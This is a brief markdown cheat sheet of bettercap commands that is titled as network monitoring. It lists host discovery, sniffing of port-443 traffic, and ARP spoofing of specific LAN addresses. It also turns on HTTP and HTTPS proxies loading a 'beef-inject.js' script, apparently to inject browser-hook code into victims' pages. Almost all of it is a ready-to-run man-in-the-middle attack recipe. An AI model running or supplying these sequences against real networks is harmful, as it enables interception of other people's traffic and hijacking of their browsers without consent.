# monitor activities on your network

- open

```
bettercap
net.probe on
sleep 1
net.probe off
set arp.spoof.targets 192.168.50.25
set http.proxy.script beef-inject.js
http.proxy on
sleep 1
arp.spoof on
```





- who's on the network

```
net.probe on
clear
ticker on
```

- sniff

```
net.probe on
sleep 1
net.probe off
set net.sniff.verbose false
set net.sniff.local true
set net.sniff.filter tcp port 443
net.sniff on
```

set target

```
set arp.spoof.targets 192.168.50.150
```

run
```
http.proxy on
https.proxy on
arp.spoof on
```
